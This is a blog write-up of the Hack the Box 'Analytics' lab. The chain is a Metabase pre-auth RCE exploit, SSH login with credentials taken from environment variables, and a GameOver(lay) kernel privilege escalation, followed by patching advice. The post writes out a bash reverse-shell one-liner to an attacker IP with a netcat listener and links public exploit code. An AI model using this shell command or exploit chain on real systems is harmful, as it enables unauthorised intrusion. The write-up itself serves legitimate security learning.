---
title: 'Analytics without Metasploit &#8211; Hack the Box #1'
date: '2024-03-06T17:27:24+00:00'
draft: false
permalink: /2024/03/06/analytics-without-metasploit-hack-the-box-1
author: William
excerpt: ''
type: post
id: 694
thumbnail: ../../../../uploads/2024/03/Analytics-e1710797452567.png
categories:
    - 'Penetration Testing'
tag: []
post_format: []
site-sidebar-layout:
    - default
ast-site-content-layout:
    - default
site-content-style:
    - default
site-sidebar-style:
    - default
theme-transparent-header-meta:
    - default
_yoast_wpseo_primary_category:
    - ''
_yoast_wpseo_content_score:
    - '30'
astra-migrate-meta-layouts:
    - set
---
This is my first Hack the Box machine [pwned](https://www.hackthebox.com/achievement/machine/1695260/569) and it’s called Analytics. Here is a mock write-up of the lab because as we all know. It’s great being able to pwn things but if we can’t communicate the remediations to what we have done then there is no benifit past that juicy dopamine hit when you get root 😀

#### Executive summary

The attacker achieved an initial foothold by abusing a pre-authentication remote code execution exploit to achieve a reverse shell. User credentials we then found in the environment variables and used to establish a user shell. This can be prevented by upgrading Metabase to the latest version and removing the environment variables with user account details if possible as a secondary objective.

Privilege was then escalated by using 2 kernel exploits from 2023 chained together. These can be remedied by upgrading our kernel version.  
The general recommendation is to update the software mentioned to later versions.

#### Technical Findings

Starting as per with a good old Nmap

![](https://i0.wp.com/i.imgur.com/D6fORW7.png?resize=798%2C212&ssl=1)

Nothing of too much interest, let’s take a closer look at the website.

For this will need to put <http://analytical.htb/> in my hosts file and run this puppy through Burp suite

There isnt much here but the login reroutes us to <http://data.analytical.htb/>. Adding that to our hosts file gets us this lovely Metabase login screen

![](https://i0.wp.com/i.imgur.com/OaJ9aIR.png?resize=504%2C552&ssl=1)

Lets dive into Metabase. There are default credentials available but those dont work. Looking for explicit exploits on the internet we find this [lovely git repo](https://github.com/Pyr0sec/CVE-2023-38646).

It allows for pre-auth remote code execution, this is exactly what we want. For this we need the setup token that can be found at the path `/api/session/properties`

Hitting this endpoint gets us a wonderful .json properties file. And within it we find the value of `setup-token` required for the execution of the exploit

![](https://i0.wp.com/i.imgur.com/xVUvF7H.png?resize=1048%2C669&ssl=1)

Using this wonderful script combined with the token we can initialize a reverse shell using the following command, oh and also don’t forget the listener on the other side:

`bash -i >& /dev/tcp/10.10.14.26/4444 0>&1<br></br>nc -nvlp 4444`

![](https://i0.wp.com/i.imgur.com/HrFdCZ7.png?resize=1136%2C160&ssl=1)

The server returns an error message but we got the juicy juicy shell

![](https://i0.wp.com/i.imgur.com/jmRtvHp.png?resize=537%2C183&ssl=1)

But sadly there is no flag in `/home/metabase` and mind you we are looking for both a user flag and a root flag… So is this not the user we are meant to be???

After a little digging around on this box for longer than I care to admit… I enumerated everything from cron jobs, running processes, kernel versions, installed apps, and much more looking for either user credentials or a route to escalate my privilage. I looked where I should have looked almost right away `env`

![](https://i0.wp.com/i.imgur.com/S6NJTdc.png?resize=559%2C290&ssl=1)

And there is the puppy. META\_USER and META\_PASS. Now could these be used to log in to the open SSH port on 22?

![](https://i0.wp.com/i.imgur.com/GTjtfdt.png?resize=652%2C152&ssl=1)

And it works! With our lovely user flag right there.

![](https://i0.wp.com/i.imgur.com/woWFcy3.png?resize=711%2C38&ssl=1)

Now to get root. I came back to this bad boy while working in a coffee shop and used the pwnbox provided by Hack the Box as my attack box. Let’s see what we can do.

There are several things I tried to look through. What binaries run within the admin context? Nope… Perhaps some cron jobs? Nope

Well what is the kernel and OS we are running on?

![](https://i0.wp.com/i.imgur.com/JLwNR2a.png?resize=799%2C70&ssl=1)

After a Google search for **linux 6.2.0-25-generic 22.04.2-ubuntu privilege escalation**, we found an interesting privilege escalation exploit called **GameOver(lay)** here is a link to a [POC on Github](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)

The script is a massive one-liner so let’s copy that bad boy onto our target machine and give it execute permissions

![](https://i0.wp.com/i.imgur.com/UlR3Ri3.png?resize=822%2C353&ssl=1)

This exploit makes use of two seperate vulnerabilities namely [**CVE-2023-2640**](https://www.cvedetails.com/cve/CVE-2023-2640/) and [**CVE-2023-32629**](https://www.cvedetails.com/cve/CVE-2023-32629/). Lets execute this bad boy!

![](https://i0.wp.com/i.imgur.com/emOZ2X4.png?resize=741%2C112&ssl=1)

ROOT BABY!!! and we find a beautiful flag right where we want her!

![](https://i0.wp.com/i.imgur.com/TaAKD3d.png?resize=601%2C47&ssl=1)

#### Conclusion

Both the exploitation of the Metabase and Kernel exploits can be solved with simply updating the respective software and operating system.

This was a fun lab and dont worry there are plenty more to come. Oh and if you have read this far… Go touch some grass 😀